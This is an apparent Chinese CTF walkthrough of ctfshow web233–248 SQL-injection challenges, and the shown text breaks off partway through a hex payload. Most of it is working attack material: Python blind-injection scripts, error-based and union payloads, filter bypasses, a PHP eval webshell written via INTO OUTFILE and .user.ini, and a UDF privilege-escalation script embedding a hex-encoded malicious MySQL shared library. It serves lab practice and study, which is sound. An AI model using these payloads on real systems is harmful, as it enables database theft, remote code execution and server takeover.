<pre class="language-php" data-language="php"><code class="language-php">&#x2F;&#x2F;分页查询
$sql &#x3D; &quot;update ctfshow_user set pass &#x3D; &#39;&#123;$password&#125;&#39; where username &#x3D; &#39;&#123;$username&#125;&#39;;&quot;;
      
&#x2F;&#x2F;无过滤</code></pre>
<p>我们能注意到当输入密码的值为第一次出现时且正确时，后面的结果会出现<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690464682345-2a7b7d80-3e4d-4124-aefd-9a98db2a726d.png" alt="image.png"><br>但是如果后面为0或者出现过一次则出现<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690464738476-4e900a40-1db3-4449-b894-43c55ffd9137.png" alt="image.png">、<br>编写脚本即可：</p>
<pre class="language-php" data-language="php"><code class="language-php"># -*- encoding: utf-8 -*-
&quot;&quot;&quot;
@File    :   SQL布尔盲注.py   
@Contact :   2997453446@qq.com
@Blog    :   natro92.github.io
 
@Modify Time      @Author    @Version    @Desciption
------------      -------    --------    -----------
2023&#x2F;7&#x2F;27 21:10   natro92      1.0         None
&quot;&quot;&quot;
import string
import requests
import time
import random


url &#x3D; r&#39;http:&#x2F;&#x2F;9a69458e-791c-4ebd-abe9-45cc89eaf042.challenge.ctf.show&#x2F;api&#x2F;&#39;
flag_pre &#x3D; &#39;ctfshow&#123;&#39;
str1 &#x3D; &quot;abcdefghijklmnopqrstuvwxyz0123456789&#123;&lt;&gt;$&#x3D;,;_ -&#125;&quot;
# payload &#x3D; &quot;ctfshow&#39;and+if(mid((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;&#125;,1)&#x3D;(&#39;&#123;&#125;&#39;),1,0)#&quot;
# payload &#x3D; &quot;ctfshow&#39;and+if(mid((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag233333&#39;),&#123;&#125;,1)&#x3D;(&#39;&#123;&#125;&#39;),1,0)#&quot;
payload &#x3D; &quot;ctfshow&#39;and+if(mid((select flagass233 from flag233333),&#123;&#125;,1)&#x3D;(&#39;&#123;&#125;&#39;),1,0)#&quot;
res &#x3D; &#39;&#39;

for i in range(1,100):
    for j in str1:
        data &#x3D; &#123;
            &#39;username&#39;: payload.format(i, j),
            &#39;password&#39;: str(random.random())
        &#125;
        r &#x3D; requests.post(url, data&#x3D;data)
        # print(data)
        # print(r.json()[&#39;msg&#39;])
        if r&#39;成功&#39; in r.json()[&#39;msg&#39;]:
            res +&#x3D; j
            print(res)
            break
        if j &#x3D;&#x3D; &#39;&#125;&#39;:
            exit()

</code></pre>
<h1 id="web234"><a href="#web234" class="headerlink" title="web234"></a>web234</h1><p>单引号被过滤了，这里用了一个<code>\</code>来逃逸。<br>就比如原语句是：</p>
<pre class="language-php" data-language="php"><code class="language-php">$sql &#x3D; &quot;update ctfshow_user set pass &#x3D; &#39;&#123;$password&#125;&#39; where username &#x3D; &#39;&#123;$username&#125;&#39;;&quot;;</code></pre>
<p>插入之后的语句是：</p>
<pre class="language-php" data-language="php"><code class="language-php">$sql &#x3D; &quot;update ctfshow_user set pass &#x3D; &#39;\&#39; where username &#x3D; &#39;username&#39;;&quot;;</code></pre>
<p>然后pass张的内容就是<code>&#39; where username =</code><br>可能这么讲会听不太懂，就是将&#39;当作转义的’ 然后和后面的单引号闭合：<br><code>update ctfshow_user set pass = &#39;\&#39; where username = &#39;username&#39;;</code><br>也就变为了：<br><code>update ctfshow_user set pass = &#39;&#39; where username = &#39;username&#39;</code><br>测试payload：</p>
<pre class="language-php" data-language="php"><code class="language-php">password&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(table_name) from information_schema.columns where table_schema&#x3D;database())--+
  banlist,ctfshow_user,ctfshow_user,flag23a</code></pre>
<p>这里过滤掉了单引号，但是不闭合就查询不到，那就用十六进制来代替一下：</p>
<pre class="language-php" data-language="php"><code class="language-php">password&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(column_name) from information_schema.columns where table_name&#x3D;0x666c6167323361)--+
  id,flagass23s3,info</code></pre>
<pre class="language-php" data-language="php"><code class="language-php">password&#x3D;\&amp;username&#x3D;,username&#x3D;(select flagass23s3 from flag23a)--+
  ctfshow&#123;a4682f2f-3c53-464d-8733-7d88487cb1f5&#125;</code></pre>
<h1 id="web235"><a href="#web235" class="headerlink" title="web235"></a>web235</h1><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.jb51.net/article/134678.htm">https://www.jb51.net/article/134678.htm</a> mysql统计信息<br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/98206699">https://zhuanlan.zhihu.com/p/98206699</a> 无列名注入</p>
</blockquote>
<h3 id="过滤了or-‘-information表的替代方法"><a href="#过滤了or-‘-information表的替代方法" class="headerlink" title="过滤了or  ‘ information表的替代方法"></a>过滤了or  ‘ information表的替代方法</h3><p>这里不只是or关键字不能用，连带着information也不能用了，因此也就需要用你别的查询方法了。<br><code>mysql.innodb_table_stats</code><br>比如：</p>
<pre class="language-php" data-language="php"><code class="language-php">password&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(table_name) from mysql.innodb_table_stats where database_name&#x3D;database())--+
  banlist,ctfshow_user,flag23a1</code></pre>
<pre class="language-php" data-language="php"><code class="language-php">select b from (select 1,2 as b,3 union select * from flag23a1 limit 1,1)a
  ctfshow&#123;9970dea2-cadb-42d7-8c3b-a54b2ea469d1&#125;</code></pre>
<p>或者用：</p>
<pre class="language-php" data-language="php"><code class="language-php">username&#x3D;,username&#x3D;(select &#96;2&#96; from(select 1,2,3 union select * from flag23a1 limit 1,1)a)-- - &amp;password&#x3D;\
ctfshow&#123;9970dea2-cadb-42d7-8c3b-a54b2ea469d1&#125;</code></pre>
<p>无列名这种特殊注入都可以。</p>
<h1 id="web236"><a href="#web236" class="headerlink" title="web236"></a>web236</h1><p>还过滤掉了flag这次 但没啥用 绕过flag的策略有很多。</p>
<pre class="language-php" data-language="php"><code class="language-php">password&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(table_name) from mysql.innodb_table_stats where database_name&#x3D;database())--+
banlist,ctfshow_user,flaga</code></pre>
<pre class="language-sql" data-language="sql"><code class="language-sql">password&#x3D;\&amp;username&#x3D;,username&#x3D;(select to_base64(b) from (select 1,2 as b,3 union select * from flaga limit 1,1)a)--+
Y3Rmc2hvd3tkOTQyOTcxNC00MTA2LTRkMjItYjg0YS01ODFiOTIzOWI2MGJ9
ctfshow&#123;d9429714-4106-4d22-b84a-581b9239b60b&#125;</code></pre>
<h1 id="web237"><a href="#web237" class="headerlink" title="web237"></a>web237</h1><h3 id="insert"><a href="#insert" class="headerlink" title="insert"></a>insert</h3><p>记得抓包，不是原来的那个api接口了，而是：<code>/api/insert.php</code><br>其余的都相同。</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">username&#x3D;7&#39;,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()));--+&amp;password&#x3D;2
banlist,ctfshow_user,flag</code></pre>
<pre class="language-sql" data-language="sql"><code class="language-sql">username&#x3D;7&#39;,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag&#39;));--+&amp;password&#x3D;2	
id,flagass23s3,info</code></pre>
<pre class="language-sql" data-language="sql"><code class="language-sql">username&#x3D;6&#39;,(select flagass23s3 from flag));--+&amp;password&#x3D;2
ctfshow&#123;5efc59c3-4a93-4d07-a546-5a702b6c57c1&#125;</code></pre>
<h1 id="web238"><a href="#web238" class="headerlink" title="web238"></a>web238</h1><h3 id="insert-过滤空格"><a href="#insert-过滤空格" class="headerlink" title="insert 过滤空格"></a>insert 过滤空格</h3><pre class="language-sql" data-language="sql"><code class="language-sql">username&#x3D;3&#39;,(select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database())));#&amp;password&#x3D;1
banlist,ctfshow_user,flagb</code></pre>
<pre class="language-sql" data-language="sql"><code class="language-sql">username&#x3D;3&#39;,(select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;flagb&#39;)));#&amp;password&#x3D;1
id,flag,info</code></pre>
<pre class="language-sql" data-language="sql"><code class="language-sql">username&#x3D;3&#39;,(select(flag)from(flagb)));#&amp;password&#x3D;1
ctfshow&#123;be8f3e4a-b6a0-4747-80d3-91979ef33988&#125;</code></pre>
<h1 id="web239"><a href="#web239" class="headerlink" title="web239"></a>web239</h1><h3 id="过滤空格-or"><a href="#过滤空格-or" class="headerlink" title="过滤空格 or"></a>过滤空格 or</h3><p>相同操作，只不过更换查询的表：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">username&#x3D;3&#39;,(select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name&#x3D;database())));#&amp;password&#x3D;1
banlist,ctfshow_user,flagbb</code></pre>
<p>这玩应把*过滤了，只能猜flag名，看了一下网上的做法基本如此。</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">username&#x3D;1&#39;,(select&#96;flag&#96;from&#96;flagbb&#96;));#&amp;password&#x3D;1
ctfshow&#123;0e1b5153-fff7-48be-aca1-cef950d964a0&#125;</code></pre>
<h1 id="web240"><a href="#web240" class="headerlink" title="web240"></a>web240</h1><p>Hint: 表名共9位，flag开头，后五位由a&#x2F;b组成，如flagabaab，全小写<br>意思就是让我们爆破呗。</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">import requests

url &#x3D; &quot;http:&#x2F;&#x2F;a2483863-8c01-4755-a5b3-decf561e6728.challenge.ctf.show&#x2F;api&#x2F;insert.php&quot;
name &#x3D; &quot;flag&quot;
res &#x3D; &#39;&#39;
for a in &#39;ab&#39;:
    for b in &#39;ab&#39;:
        for c in &#39;ab&#39;:
            for d in &#39;ab&#39;:
                for e in &#39;ab&#39;:
                    res &#x3D; name + a + b + c + d + e
                    data &#x3D; &#123;
                        &#39;username&#39;: f&quot;&#123;res&#125;&#39;,(select(flag)from(&#123;res&#125;)))#&quot;,
                        &#39;password&#39;: &#39;a&#39;
                    &#125;
                    print(data)
                    r &#x3D; requests.post(url, data&#x3D;data)</code></pre>
<p>跑完一遍之后刷新一下：<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690546632830-eb02d773-ff79-495a-9e30-5aa8c826e14b.png" alt="image.png"></p>
<h1 id="web241"><a href="#web241" class="headerlink" title="web241"></a>web241</h1><h3 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h3><p>遇事不决直接上盲注：<br>目标位置<code>api/delete.php</code><br>先决定一下测试payload，直接在id中传入：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">if(substr((database())),1,1)&#x3D;&#39;c&#39;,sleep(0.05),0)</code></pre>
<p>这时间盲注不同设备的时间不同，根据自己调整</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"># -*- encoding: utf-8 -*-
&quot;&quot;&quot;
@File    :   SQL时间盲注1.py   
@Contact :   2997453446@qq.com
@Blog    :   natro92.github.io
 
@Modify Time      @Author    @Version    @Desciption
------------      -------    --------    -----------
2023&#x2F;7&#x2F;28 20:21   natro92      1.0        web241
&quot;&quot;&quot;
import time

import requests
from tqdm import trange

url &#x3D; r&#39;http:&#x2F;&#x2F;b2100936-f04f-42cf-a179-f6bb35e08972.challenge.ctf.show&#x2F;api&#x2F;delete.php&#39;
flag_pre &#x3D; &#39;ctfshow&#123;&#39;
str &#x3D; &quot;_abcdefghijklmnopqrstuvwxyz0123456789&#123;-,&#125; &quot;
# inside &#x3D; &#39;database()&#39;
# inside &#x3D; &#39;select group_concat(table_name) from information_schema.tables where table_schema &#x3D; database()&#39;
# inside &#x3D; &#39;select group_concat(column_name) from information_schema.columns where table_name &#x3D; &quot;flag&quot;&#39;
inside &#x3D; &#39;substr((select group_concat(flag) from flag),9,36)&#39;

payload &#x3D; &quot;if(substr((&#123;&#125;),&#123;&#125;,1)&#x3D;&#39;&#123;&#125;&#39;,sleep(0.05),0)&quot;
res &#x3D; &#39;&#39;
last &#x3D; &#39; &#39;

for i in trange(1, 37):
    for j in str:
        data &#x3D; &#123;
            &#39;id&#39;: payload.format(inside, i, j),
        &#125;
        try:
            # print(data)
            r &#x3D; requests.post(url, data&#x3D;data, timeout&#x3D;1)
        except Exception as e:
            last &#x3D; res
            res +&#x3D; j
            # print(res)
            break
        if last &#x3D;&#x3D; res.replace(&#39; &#39;,&#39;&#39;):
            exit()
        time.sleep(1)
    print(res)
</code></pre>
<p>网络的好坏决定着你在这个途中是否会出现错误。尽量减少位数的盲注，知道的前缀就别注了。</p>
<h1 id="web242"><a href="#web242" class="headerlink" title="web242"></a>web242</h1><h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><pre class="language-sql" data-language="sql"><code class="language-sql">select * from ctfshow_user into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;dump&#x2F;&#123;$filename&#125;&#39;;</code></pre>
<h2 id="字段分隔符"><a href="#字段分隔符" class="headerlink" title="字段分隔符"></a>字段分隔符</h2><pre class="language-sql" data-language="sql"><code class="language-sql">FIELDS TERMINATED BY‘,‘字段间分割符
OPTIONALLY ENCLOSED BY‘&quot;‘将字段包围 对数值型无效</code></pre>
<p>相关参考：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">SELECT ... INTO OUTFILE &#39;file_name&#39;
        [CHARACTER SET charset_name]
        [export_options]
 
export_options:
    [&#123;FIELDS | COLUMNS&#125;
        [TERMINATED BY &#39;string&#39;]&#x2F;&#x2F;分隔符
        [[OPTIONALLY] ENCLOSED BY &#39;char&#39;]
        [ESCAPED BY &#39;char&#39;]
    ]
    [LINES
        [STARTING BY &#39;string&#39;]
        [TERMINATED BY &#39;string&#39;]
    ]

&#x2F;***********************************************************&#x2F;

“OPTION”参数为可选参数选项，其可能的取值有：
 
&#96;FIELDS TERMINATED BY &#39;字符串&#39;&#96;：设置字符串为字段之间的分隔符，可以为单个或多个字符。默认值是“\t”。
 
&#96;FIELDS ENCLOSED BY &#39;字符&#39;&#96;：设置字符来括住字段的值，只能为单个字符。默认情况下不使用任何符号。
 
&#96;FIELDS OPTIONALLY ENCLOSED BY &#39;字符&#39;&#96;：设置字符来括住CHAR、VARCHAR和TEXT等字符型字段。默认情况下不使用任何符号。
 
&#96;FIELDS ESCAPED BY &#39;字符&#39;&#96;：设置转义字符，只能为单个字符。默认值为“\”。
 
&#96;LINES STARTING BY &#39;字符串&#39;&#96;：设置每行数据开头的字符，可以为单个或多个字符。默认情况下不使用任何字符。
 
&#96;LINES TERMINATED BY &#39;字符串&#39;&#96;：设置每行数据结尾的字符，可以为单个或多个字符。默认值是“\n”。
</code></pre>
<p>比如：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">select * from user into outfile &quot;位置&quot; fileds terminated by &#39;写入内容&#39;</code></pre>
<p>当然换行符也可以使用。</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">&#x2F;&#x2F;备份表
$sql &#x3D; &quot;select * from ctfshow_user into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;dump&#x2F;&#123;$filename&#125;&#39;;&quot;;</code></pre>
<p>我们直接使用测试木马接口位置<code>/api/dump.php</code></p>
<pre class="language-sql" data-language="sql"><code class="language-sql">filename&#x3D;1.php&#39; fields terminated by &#39;&lt;?php eval($_REQUEST[1]);?&gt;&#39;#</code></pre>
<p>然后访问<code>/dump/1.php</code><br>get或post传参：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">1&#x3D;system(&#39;cat &#x2F;flag.here&#39;);</code></pre>
<h1 id="web243"><a href="#web243" class="headerlink" title="web243"></a>web243</h1><h3 id="sql加文件上传图片马"><a href="#sql加文件上传图片马" class="headerlink" title="sql加文件上传图片马"></a>sql加文件上传图片马</h3><pre class="language-sql" data-language="sql"><code class="language-sql">0xa6175746f5f70726570656e645f66696c653d312e6a7067
&#x3D;&#x3D;&gt; 
\nauto_prepend_file&#x3D;1.jpg</code></pre>
<p>首先先传入：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">filename&#x3D;1.jpg&#39; LINES TERMINATED BY 0xa6175746f5f70726570656e645f66696c653d312e6a7067</code></pre>
<p>再传入<code>.user.ini</code>：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">filename&#x3D;.user.ini&#39; LINES TERMINATED BY 0x0A6175746F5F70726570656E645F66696C653D67796C712E6A70670A#
其中0x0A6175746F5F70726570656E645F66696C653D67796C712E6A70670A是&lt;?php eval($_REQUEST[1]);?&gt;</code></pre>
<p>然后访问：<code>dump/index.php</code><br>传入命令即可。<code>1=system(&#39;cat /flag.here&#39;);</code></p>
<h1 id="web244"><a href="#web244" class="headerlink" title="web244"></a>web244</h1><h3 id="报错注入-updatexml"><a href="#报错注入-updatexml" class="headerlink" title="报错注入 updatexml"></a>报错注入 updatexml</h3><pre class="language-sql" data-language="sql"><code class="language-sql">&#x2F;&#x2F;备份表
$sql &#x3D; &quot;select id,username,pass from ctfshow_user where id &#x3D; &#39;&quot;.$id.&quot;&#39; limit 1;&quot;;
&#x2F;&#x2F;无过滤</code></pre>
<p>用updatexml报错注入</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">&#x2F;api&#x2F;?id&#x3D;&#39; or updatexml(1,concat(1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())),1) --+
banlist,ctfshow_flag,ctfshow_use</code></pre>
<pre class="language-sql" data-language="sql"><code class="language-sql">&#x2F;?id&#x3D;&#39; or updatexml(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flag&#39;)),1) -- A
id,flag,info</code></pre>
<pre class="language-sql" data-language="sql"><code class="language-sql">flag太长需要查两遍：
api&#x2F;?id&#x3D;&#39; or updatexml(1,concat(1,(select mid(flag,1,30) from ctfshow_flag)),1) --+
api&#x2F;?id&#x3D;&#39; or updatexml(1,concat(1,(select mid(flag,20,30) from ctfshow_flag)),1) --+</code></pre>
<p>然后拼起来：<br>ctfshow{99150aa0-0cf6-4537-ad52-3043e2647334}</p>
<h1 id="web245"><a href="#web245" class="headerlink" title="web245"></a>web245</h1><h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h3><p>用法类似，这里不多赘述了</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">api&#x2F;?id&#x3D;1&#39; or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e)); --+
banlist,ctfshow_flagsa,ctfshow_</code></pre>
<pre class="language-sql" data-language="sql"><code class="language-sql">api&#x2F;?id&#x3D;1&#39; or extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flagsa&#39;),0x7e)); --+
id,flag1,info</code></pre>
<pre class="language-sql" data-language="sql"><code class="language-sql">api&#x2F;?id&#x3D;1&#39; or extractvalue(1,concat(0x7e,(select right(flag1,45) from ctfshow_flagsa),0x7e)); --+
ctfshow&#123;1eaee386-fce7-49d8-86fd
api&#x2F;?id&#x3D;1&#39; or extractvalue(1,concat(0x7e,(select right(flag1,30) from ctfshow_flagsa),0x7e)); --+
6-fce7-49d8-86fd-15c29674ed78&#125;</code></pre>
<p>ctfshow{1eaee386-fce7-49d8-86fd-15c29674ed78}</p>
<h1 id="web246"><a href="#web246" class="headerlink" title="web246"></a>web246</h1><blockquote>
<p><a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://www.cnblogs.com/wzy-ustc/p/14217750.html">https://www.cnblogs.com/wzy-ustc/p/14217750.html</a><br><a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://www.cnblogs.com/laoxiajiadeyun/p/10283251.html">https://www.cnblogs.com/laoxiajiadeyun/p/10283251.html</a></p>
</blockquote>
<h3 id="floor双查询"><a href="#floor双查询" class="headerlink" title="floor双查询"></a>floor双查询</h3><pre class="language-sql" data-language="sql"><code class="language-sql">&#x2F;&#x2F;查表名
&#x2F;?id&#x3D;1&#39; union select 1,count(*),concat((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1),0x7e,floor(rand()*2))a from information_schema.tables group by a-- A
&#x2F;&#x2F;查列名
&#x2F;?id&#x3D;1&#39; union select 1,count(*),concat((select column_name from information_schema.columns where table_name&#x3D;&#39;ctfshow_flags&#39; limit 1,1),0x7e,floor(rand()*2))a from information_schema.tables group by a-- A
&#x2F;&#x2F;查数据
&#x2F;?id&#x3D;1&#39; union select 1,count(*),concat((select flag2 from ctfshow_flags),0x7e,floor(rand()*2))a from information_schema.tables group by a-- A</code></pre>
<p>需要二次上传才会出现结果</p>
<h1 id="web247"><a href="#web247" class="headerlink" title="web247"></a>web247</h1><h3 id="ceil代替floor"><a href="#ceil代替floor" class="headerlink" title="ceil代替floor"></a>ceil代替floor</h3><pre class="language-sql" data-language="sql"><code class="language-sql">$sql &#x3D; &quot;select id,username,pass from ctfshow_user where id &#x3D; &#39;&quot;.$id.&quot;&#39; limit 1;&quot;;</code></pre>
<p>使用ceil()(向上取整)代替floor()。当然也可以使用round()：<br>ROUND(X) – 表示将值 X 四舍五入为整数，无小数位<br>ROUND(X,D) – 表示将值 X 四舍五入为小数点后 D 位的数值，D为小数点后小数位数。若要保留 X 值小数点左边的 D 位，可将 D 设为负值。<br>最后的payload是：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">&#x2F;?id&#x3D;1&#39; union select 1,count(*),concat((select &#96;flag?&#96; from ctfshow_flagsa),0x7e,ceil(rand()*2))a from information_schema.tables group by a-- A</code></pre>
<p>可以看到这个字段名flag?加了反引号，原因是：<br>表名和字段名都可以用反引号引起来，这是用来区分MYSQL的保留字与普通字符。 表名、字段名、数据库名等可用反引号 ( &#96; )，也可以不使用反引号 ，但如果它包含特殊字符或保留字，则必须使用，如果不使用就会报错。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690557907870-84c2d526-6b51-41e6-9887-7731d9ddac80.png" alt="image.png"></p>
<h1 id="web248"><a href="#web248" class="headerlink" title="web248"></a>web248</h1><h3 id="UDF"><a href="#UDF" class="headerlink" title="UDF"></a>UDF</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://lazzzaro.github.io/2020/05/16/web-SQL%E6%B3%A8%E5%85%A5/">https://lazzzaro.github.io/2020/05/16/web-SQL%E6%B3%A8%E5%85%A5/</a><br><a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2018/10/21/Mysql%20%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8/#%E4%B8%89%E3%80%81MYSQL-UDF-%E6%8F%90%E6%9D%83">https://www.k0rz3n.com/2018/10/21/Mysql%20%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8/#%E4%B8%89%E3%80%81MYSQL-UDF-%E6%8F%90%E6%9D%83</a><br><a target="_blank" rel="noopener" href="https://www.sqlsec.com/tools/udf.html">https://www.sqlsec.com/tools/udf.html</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_35938621/article/details/119846053">https://blog.csdn.net/qq_35938621&#x2F;article&#x2F;details&#x2F;119846053</a> 这里讲了详细步骤 建议看看</p>
</blockquote>
<p>UDF是mysql的一个拓展接口，UDF（Userdefined function）可翻译为用户自定义函数，这个是用来拓展Mysql的技术手段。当我们有读取和写入权限以后，我们就可以尝试使用UDF提权的方法，从数据库的root权限提升到系统的管理员权限。</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">#参考脚本
#环境：Linux&#x2F;MariaDB
import requests
 
url&#x3D;&#39;http:&#x2F;&#x2F;89a7098e-03f5-47f3-9cb5-1f1cd3d640e9.challenge.ctf.show:8080&#x2F;api&#x2F;?id&#x3D;&#39;
code&#x3D;&#39;7F454C4602010100000000000000000003003E0001000000800A000000000000400000000000000058180000000000000000000040003800060040001C0019000100000005000000000000000000000000000000000000000000000000000000C414000000000000C41400000000000000002000000000000100000006000000C814000000000000C814200000000000C8142000000000004802000000000000580200000000000000002000000000000200000006000000F814000000000000F814200000000000F814200000000000800100000000000080010000000000000800000000000000040000000400000090010000000000009001000000000000900100000000000024000000000000002400000000000000040000000000000050E574640400000044120000000000004412000000000000441200000000000084000000000000008400000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000040000001400000003000000474E5500D7FF1D94176ABA0C150B4F3694D2EC995AE8E1A8000000001100000011000000020000000700000080080248811944C91CA44003980468831100000013000000140000001600000017000000190000001C0000001E000000000000001F00000000000000200000002100000022000000230000002400000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED971581CA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF3B9FD4A0AD73D1C50B5911FEAB5FBE1200000000000000000000000000000000000000000000000000000000000000000300090088090000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000CD00000012000000000000000000000000000000000000001E0100001200000000000000000000000000000000000000620100001200000000000000000000000000000000000000E30000001200000000000000000000000000000000000000B90000001200000000000000000000000000000000000000680100001200000000000000000000000000000000000000160000002200000000000000000000000000000000000000540000001200000000000000000000000000000000000000F00000001200000000000000000000000000000000000000B200000012000000000000000000000000000000000000005A01000012000000000000000000000000000000000000005201000012000000000000000000000000000000000000004C0100001200000000000000000000000000000000000000E800000012000B00D10D000000000000D1000000000000003301000012000B00A90F0000000000000A000000000000001000000012000C00481100000000000000000000000000007800000012000B009F0B0000000000004C00000000000000FF0000001200090088090000000000000000000000000000800100001000F1FF101720000000000000000000000000001501000012000B00130F0000000000002F000000000000008C0100001000F1FF201720000000000000000000000000009B00000012000B00480C0000000000000A000000000000002501000012000B00420F0000000000006700000000000000AA00000012000B00520C00000000000063000000000000005B00000012000B00950B0000000000000A000000000000008E00000012000B00EB0B0000000000005D00000000000000790100001000F1FF101720000000000000000000000000000501000012000B00090F0000000000000A00000000000000C000000012000B00B50C000000000000F100000000000000F700000012000B00A20E00000000000067000000000000003900000012000B004C0B0000000000004900000000000000D400000012000B00A60D0000000000002B000000000000004301000012000B00B30F0000000000005501000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F696E6974006D656D637079006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F007379735F6765745F696E6974007379735F6765745F6465696E6974007379735F67657400676574656E76007374726C656E007379735F7365745F696E6974006D616C6C6F63007379735F7365745F6465696E69740066726565007379735F73657400736574656E76007379735F657865635F696E6974007379735F657865635F6465696E6974007379735F657865630073797374656D007379735F6576616C5F696E6974007379735F6576616C5F6465696E6974007379735F6576616C00706F70656E007265616C6C6F63007374726E6370790066676574730070636C6F7365006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E3500000000000000000000020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001006F0100001000000000000000751A6909000002009101000000000000F0142000000000000800000000000000F0142000000000007816200000000000060000000200000000000000000000008016200000000000060000000300000000000000000000008816200000000000060000000A0000000000000000000000A81620000000000007000000040000000000000000000000B01620000000000007000000050000000000000000000000B81620000000000007000000060000000000000000000000C01620000000000007000000070000000000000000000000C81620000000000007000000080000000000000000000000D01620000000000007000000090000000000000000000000D816200000000000070000000A0000000000000000000000E016200000000000070000000B0000000000000000000000E816200000000000070000000C0000000000000000000000F016200000000000070000000D0000000000000000000000F816200000000000070000000E00000000000000000000000017200000000000070000000F00000000000000000000000817200000000000070000001000000000000000000000004883EC08E8EF000000E88A010000E8750700004883C408C3FF35F20C2000FF25F40C20000F1F4000FF25F20C20006800000000E9E0FFFFFFFF25EA0C20006801000000E9D0FFFFFFFF25E20C20006802000000E9C0FFFFFFFF25DA0C20006803000000E9B0FFFFFFFF25D20C20006804000000E9A0FFFFFFFF25CA0C20006805000000E990FFFFFFFF25C20C20006806000000E980FFFFFFFF25BA0C20006807000000E970FFFFFFFF25B20C20006808000000E960FFFFFFFF25AA0C20006809000000E950FFFFFFFF25A20C2000680A000000E940FFFFFFFF259A0C2000680B000000E930FFFFFFFF25920C2000680C000000E920FFFFFF4883EC08488B05ED0B20004885C07402FFD04883C408C390909090909090909055803D680C2000004889E5415453756248833DD00B200000740C488D3D2F0A2000E84AFFFFFF488D1D130A20004C8D25040A2000488B053D0C20004C29E348C1FB034883EB014839D873200F1F4400004883C0014889051D0C200041FF14C4488B05120C20004839D872E5C605FE0B2000015B415CC9C3660F1F84000000000048833DC009200000554889E5741A488B054B0B20004885C0740E488D3DA7092000C9FFE00F1F4000C9C39090554889E54883EC3048897DE8488975E0488955D8488B45E08B0085C07421488D0DE7050000488B45D8BA320000004889CE4889C7E89BFEFFFFC645FF01EB04C645FF000FB645FFC9C3554889E548897DF8C9C3554889E54883EC3048897DF8488975F0488955E848894DE04C8945D84C894DD0488D0DCA050000488B45E8BA1F0000004889CE4889C7E846FEFFFF488B45E048C7001E000000488B45E8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F801751C488B45F0488B40088B0085C0750E488B45F8C60001B800000000EB20488D0D83050000488B45E8BA2B0000004889CE4889C7E8DFFDFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC4048897DE8488975E0488955D848894DD04C8945C84C894DC0488B45E0488B4010488B004889C7E8BBFDFFFF488945F848837DF8007509488B45C8C60001EB16488B4